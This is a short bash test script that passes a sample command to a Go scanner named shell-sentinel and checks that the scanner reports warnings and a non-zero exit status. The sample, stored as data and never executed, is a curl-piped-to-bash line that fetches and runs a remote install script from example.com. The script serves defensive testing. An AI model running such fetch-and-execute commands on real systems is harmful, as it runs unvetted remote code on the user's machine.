#!/usr/bin/env bash
set -euo pipefail

repo_root="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
cd "${repo_root}"

payload='bash -c "$(curl -fsSL https://example.com/install.sh)"'
report="$(mktemp)"

set +e
go run ./cmd/shell-sentinel --json --fail-on warn "${payload}" >"${report}"
status=$?
set -e

echo "exit status: ${status}"
jq -r '.findings[] | [.severity, .kind, .message] | @tsv' "${report}"

echo "expected: non-zero status with warning/error annotations from action parser"
